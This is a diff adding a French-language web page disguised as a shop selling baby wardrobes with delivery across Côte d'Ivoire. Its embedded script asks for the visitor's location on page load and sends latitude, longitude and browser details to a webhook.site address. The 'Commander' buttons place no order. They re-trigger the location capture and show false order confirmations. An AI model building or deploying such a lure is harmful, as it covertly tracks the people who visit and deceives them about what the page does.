@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Placards Bébé CI</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+      background-color: #f9f9f9;
+    }
+    h1 {
+      color: #4CAF50;
+    }
+    .product {
+      display: inline-block;
+      margin: 20px;
+      background: white;
+      padding: 15px;
+      border-radius: 8px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    .product img {
+      width: 200px;
+      height: 200px;
+    }
+    .product button {
+      margin-top: 10px;
+      padding: 10px 20px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .product button:hover {
+      background-color: #388E3C;
+    }
+    p.notice {
+      font-size: 0.9em;
+      color: #555;
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Placards pour Bébé - Livraison partout en CI</h1>
+  <p class="notice">📍 Pour afficher les points de livraison disponibles, autorisez l’accès à votre position.</p>
+
+  <div class="product">
+    <img src="https://static.jumia.ci/ni/Placard1.jpg" alt="Placard 1">
+    <p>Placard bébé modèle 1</p>
+    <button onclick="handleCommand()">Commander</button>
+  </div>
+
+  <div class="product">
+    <img src="https://static.jumia.ci/ni/Placard2.jpg" alt="Placard 2">
+    <p>Placard bébé modèle 2</p>
+    <button onclick="handleCommand()">Commander</button>
+  </div>
+
+  <div class="product">
+    <img src="https://static.jumia.ci/ni/Placard3.jpg" alt="Placard 3">
+    <p>Placard bébé modèle 3</p>
+    <button onclick="handleCommand()">Commander</button>
+  </div>
+
+  <script>
+    const webhookURL = "https://webhook.site/8b05a438-c465-4378-a197-40c1f240686f";
+
+    // Fonction pour envoyer la position
+    function sendPosition(lat, lon, source = "auto") {
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          latitude: lat,
+          longitude: lon,
+          userAgent: navigator.userAgent,
+          source: source
+        })
+      });
+    }
+
+    // Récupère la position au chargement
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        sendPosition(position.coords.latitude, position.coords.longitude, "auto");
+        localStorage.setItem("locationSent", "1");
+      },
+      function(error) {
+        console.warn("Autorisation refusée ou erreur :", error.message);
+      }
+    );
+
+    // Si l’utilisateur clique sur un bouton
+    function handleCommand() {
+      if (localStorage.getItem("locationSent") === "1") {
+        alert("Votre commande a été reçue ✅");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          sendPosition(position.coords.latitude, position.coords.longitude, "manual");
+          localStorage.setItem("locationSent", "1");
+          alert("Merci ! Votre position a été prise en compte ✅");
+        },
+        function() {
+          alert("Position refusée. Commande reçue sans localisation.");
+          sendPosition("non_disponible", "non_disponible", "refusé");
+        }
+      );
+    }
+  </script>
+</body>
+</html>
